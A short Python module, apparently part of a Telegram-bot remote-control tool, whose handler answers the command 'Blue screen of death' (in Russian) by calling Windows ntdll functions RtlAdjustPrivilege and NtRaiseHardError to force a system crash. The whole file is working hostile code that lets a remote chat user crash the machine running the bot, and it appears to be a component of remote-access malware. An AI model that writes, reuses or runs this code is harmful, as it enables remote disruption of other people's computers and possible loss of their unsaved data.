from aiogram import types
from loader import dp

import ctypes
from ctypes import *
from ctypes.wintypes import *


@dp.message_handler(text=['Ⓜ️ Синий экран смерти'])
async def stopproces1f(message: types.Message):
    await message.answer_sticker("CAACAgIAAxkBAAED8nxiDC7T9G7ZjQ2o8e7GukIqwhizeAACTQsAAi8P8AYsGupxHe233CME")
    await message.answer("🕓 Синий экран смерти запущен.", parse_mode="Markdown")
    tmp1 = c_bool()
    tmp2 = DWORD()
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(tmp2))
